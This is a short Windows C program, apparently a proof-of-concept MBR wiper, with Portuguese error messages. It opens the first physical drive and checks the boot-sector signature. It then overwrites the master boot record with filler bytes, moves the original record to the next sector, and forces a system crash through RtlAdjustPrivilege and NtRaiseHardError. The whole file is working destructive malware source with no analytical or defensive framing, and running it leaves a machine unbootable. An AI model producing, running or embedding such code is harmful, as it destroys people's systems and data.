#include <stdio.h>
#include <Windows.h>


#define SECTOR_SIZE 512
#define MBR_SIG "\x55\xAA"


NTSTATUS NTAPI RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BOOLEAN Client, PBOOLEAN WasEnabled);
NTSTATUS NTAPI NtRaiseHardError(LONG ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParametersMask, PVOID Parameters, ULONG ResponseOption, PULONG ResponsePointer);

int main() {

    HANDLE hDisk;
    unsigned char cBackup[SECTOR_SIZE];
    unsigned char cInfected[SECTOR_SIZE];
    //unsigned char cXor[SECTOR_SIZE];
    DWORD bytesRead = 0;
    DWORD bytesWritten = 0;
    BOOLEAN privilegeOld = FALSE;
    ULONG response = 0;

    hDisk = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
    if (hDisk == INVALID_HANDLE_VALUE){
        printf("Falhou o CreateFile\n");
        exit(1);
    }

    SetFilePointer(hDisk, 0, NULL, FILE_BEGIN);

    if (!ReadFile(hDisk, cBackup, SECTOR_SIZE, &bytesRead, NULL)) {
        printf("Falha em ReadFile\n");
        CloseHandle(hDisk);
        exit (1);
    }

    if (memcmp(&cBackup[SECTOR_SIZE - 2], MBR_SIG, 2)){
        printf("A assinatura nao confere\n");
        CloseHandle(hDisk);
        exit (1);
    }

    memset(cInfected, 'R', SECTOR_SIZE);

    SetFilePointer(hDisk, 0, NULL, FILE_BEGIN);

    if (!WriteFile(hDisk, cInfected, SECTOR_SIZE, &bytesWritten, NULL)) {
        printf("Falha em WriteFile\n");
        CloseHandle(hDisk);
        exit (1);
    }

    if (!WriteFile(hDisk, cBackup, SECTOR_SIZE, &bytesWritten, NULL)) {
        printf("Falha em WriteFile2\n");
        CloseHandle(hDisk);
        exit (1);
    }

    RtlAdjustPrivilege(19, TRUE, FALSE, &privilegeOld);
    NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, &response);

    return 0;

}
